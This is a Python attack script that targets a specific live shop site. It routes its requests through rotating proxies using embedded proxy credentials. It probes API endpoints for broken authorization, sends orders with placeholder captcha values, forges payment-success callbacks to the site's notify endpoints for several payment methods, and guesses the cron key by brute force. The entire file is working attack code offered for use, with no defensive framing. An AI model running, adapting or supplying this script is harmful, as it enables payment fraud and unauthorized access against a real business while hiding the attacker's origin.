#!/usr/bin/env python3
"""One-shot auth map + pay capture — run on China jump."""
import hashlib
import json
import re
import subprocess
import time
import urllib.parse
from pathlib import Path

OUT = Path("/tmp/qq1_deep7")
OUT.mkdir(exist_ok=True)
QG, PW = "C413ED6D", "344F550A6F8B"
BASE = "https://qq1.lol"
JAR = str(OUT / "j.jar")
px = None
results = {}


def fresh():
    global px
    for area in ["440000", "0", "510000", "330000", "320000", "350000"]:
        try:
            raw = subprocess.check_output(
                ["curl", "-s", "--max-time", "10",
                 f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                text=True, timeout=12,
            )
            d = json.loads(raw)
            if not (d.get("code") == "SUCCESS" and d.get("data")):
                continue
            srv = d["data"][0]["server"]
            cand = f"http://{QG}:{PW}@{srv}"
            code = subprocess.run(
                ["curl", "-sk", "--max-time", "12", "-x", cand, "-o", "/dev/null",
                 "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                capture_output=True, text=True, timeout=15,
            ).stdout.strip()
            print(f"try {area} {srv} -> {code}", flush=True)
            if code == "200":
                px = cand
                return px
        except Exception as e:
            print(f"fresh err {e}", flush=True)
        time.sleep(0.4)
    return None


def c(url, post=None, mt=15, retry=True):
    global px
    if not px:
        fresh()
    if not px:
        return "", "000"
    cmd = [
        "curl", "-sk", "--max-time", str(mt), "-x", px, "-b", JAR, "-c", JAR,
        "-A", "Mozilla/5.0",
        "-H", "Referer: https://qq1.lol/",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-w", "\n__HTTP:%{http_code}",
    ]
    if post is not None:
        body = urllib.parse.urlencode(post) if isinstance(post, dict) else post
        cmd += ["-X", "POST", "-d", body]
    cmd.append(url)
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 5).stdout or ""
    except Exception as e:
        out = str(e)
    if "__HTTP:" not in out:
        if retry and fresh():
            return c(url, post, mt, False)
        return out.strip(), "000"
    b, code = out.rsplit("__HTTP:", 1)
    code = code.strip()
    if code in ("000", "408", "502") and retry:
        if fresh():
            return c(url, post, mt, False)
    return b.strip(), code


def main():
    print("=== AUTH MAP ===", flush=True)
    if not fresh():
        raise SystemExit("no proxy")
    tests = [
        ("change_GET_all", f"{BASE}/%61pi.php?act=change&id=25949&zt=1&key=test", None),
        ("change_GET_idzt_POST_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": "test"}),
        ("change_GET_idzt_POST_wrong", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": "wrong_long_key_999"}),
        ("change_GET_id_POST_ztkey", f"{BASE}/%61pi.php?act=change&id=25949", {"zt": "1", "key": "test"}),
        ("change_POST_all", f"{BASE}/%61pi.php?act=change", {"id": "25949", "zt": "1", "key": "test"}),
        ("change_zt2_POST", f"{BASE}/%61pi.php?act=change&id=25949&zt=2", {"key": "test"}),
        ("change_zt3_POST", f"{BASE}/%61pi.php?act=change&id=25949&zt=3", {"key": "test"}),
        ("change_zt4_POST", f"{BASE}/%61pi.php?act=change&id=25949&zt=4", {"key": "test"}),
        ("tools_GET", f"{BASE}/%61pi.php?act=tools&key=test&limit=1", None),
        ("tools_POST", f"{BASE}/%61pi.php?act=tools", {"key": "test", "limit": "1"}),
        ("orders_GET", f"{BASE}/%61pi.php?act=orders&key=test&limit=1&tid=102", None),
        ("orders_POST", f"{BASE}/%61pi.php?act=orders", {"key": "test", "limit": "1", "tid": "102"}),
        ("orders_sign", f"{BASE}/%61pi.php?act=orders&key=test&sign=1&limit=1&tid=102", None),
        ("search_POST", f"{BASE}/%61pi.php?act=search", {"id": "25949", "key": "test"}),
        ("clone_GET", f"{BASE}/%61pi.php?act=clone&key=test", None),
        ("token_GET", f"{BASE}/%61pi.php?act=token&key=test", None),
        ("siteinfo", f"{BASE}/%61pi.php?act=siteinfo", None),
        ("goodslist", f"{BASE}/%61pi.php?act=goodslist", {}),
        ("goodsdetails", f"{BASE}/%61pi.php?act=goodsdetails", {"tid": "102"}),
        ("getleftcount", f"{BASE}/%61pi.php?act=getleftcount", {"tid": "102"}),
    ]
    for name, url, post in tests:
        b, code = c(url, post)
        results[name] = {"code": code, "body": b[:500]}
        print(f"{name}: HTTP={code} {b[:180]}", flush=True)
        time.sleep(0.35)

    print("=== PAY ===", flush=True)
    Path(JAR).unlink(missing_ok=True)
    c(f"{BASE}/")
    buy, _ = c(f"{BASE}/?mod=buy&cid=4&tid=102")
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy or "")
    hs_m = re.search(r"var hashsalt=(.+);", buy or "")
    print("tokens", bool(csrf), bool(hs_m), "buylen", len(buy or ""), flush=True)
    (OUT / "buy.html").write_text(buy or "", errors="replace")
    tn = None
    if csrf and hs_m:
        try:
            hs = subprocess.run(
                ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
                capture_output=True, text=True, timeout=5,
            ).stdout.strip()
        except Exception:
            hs = hs_m.group(1).strip().strip("'\"")
        pay, _ = c(f"{BASE}/ajax.php?act=pay", {
            "tid": "102", "num": "1", "inputvalue": "deep7pay",
            "csrf_token": csrf.group(1), "hashsalt": hs,
            "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
        })
        print("pay", (pay or "")[:220], flush=True)
        results["pay"] = (pay or "")[:500]
        m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
        tn = m.group(1) if m else None
        print("tn", tn, flush=True)
        results["trade_no"] = tn
        if tn:
            for typ in ["alipay", "wxpay", "qqpay", "usdt"]:
                sub, code = c(f"{BASE}/other/submit.php?type={typ}&orderid={tn}")
                (OUT / f"submit_{typ}.html").write_text(sub or "", errors="replace")
                pids = re.findall(r'name=["\']pid["\'][^>]*value=["\']([^"\']+)', sub or "", re.I)
                pids += re.findall(r"[?&]pid=([0-9]+)", sub or "")
                actions = re.findall(r'action=["\']([^"\']+)', sub or "", re.I)
                urls = list(dict.fromkeys(re.findall(r"https?://[a-zA-Z0-9._:/-]+", sub or "")))[:15]
                money = re.findall(r'name=["\']money["\'][^>]*value=["\']([^"\']+)', sub or "", re.I)
                results[f"submit_{typ}"] = {
                    "code": code, "pids": pids, "actions": actions[:5],
                    "urls": urls, "money": money, "len": len(sub or ""),
                }
                print(f"submit_{typ}: len={len(sub or '')} pids={pids} actions={actions[:2]} urls={urls[:4]}", flush=True)
                body, code = c(
                    f"{BASE}/other/notify.php?type={typ}",
                    {
                        "out_trade_no": tn, "trade_no": "E" + tn,
                        "trade_status": "TRADE_SUCCESS",
                        "money": money[0] if money else "1",
                        "pid": pids[0] if pids else "1",
                        "type": typ, "sign": "test", "name": "x",
                    },
                )
                print(f"notify_{typ}: {(body or '')[:140]}", flush=True)
                results[f"notify_{typ}"] = (body or "")[:300]
                time.sleep(0.3)

    print("=== AJAX ===", flush=True)
    for act, post in [
        ("getcount", None), ("getconfig", {}), ("getmoney", {}), ("getuser", {}),
        ("orderlist", {}), ("getorder", {"id": "25949"}), ("cart_list", {}), ("gift_start", {}),
    ]:
        b, code = c(f"{BASE}/ajax.php?act={act}", post)
        print(f"ajax_{act}: HTTP={code} {(b or '')[:160]}", flush=True)
        results[f"ajax_{act}"] = {"code": code, "body": (b or "")[:400]}

    print("=== CRON ===", flush=True)
    for k in ["buyi", "qq1", "123456", "admin", "cron", hashlib.md5(b"buyi").hexdigest()]:
        b, code = c(f"{BASE}/cron.php?key={k}")
        results[f"cron_{k}"] = {"code": code, "body": (b or "")[:120]}
        if "不正确" not in (b or "") and b and "<html" not in b.lower()[:30]:
            print(f"CRON_HIT key={k}: {b[:100]}", flush=True)
        else:
            print(f"cron {k}: {(b or '')[:80]}", flush=True)

    (OUT / "oneshot_report.json").write_text(json.dumps(results, ensure_ascii=False, indent=2))
    print("DONE", flush=True)


if __name__ == "__main__":
    main()
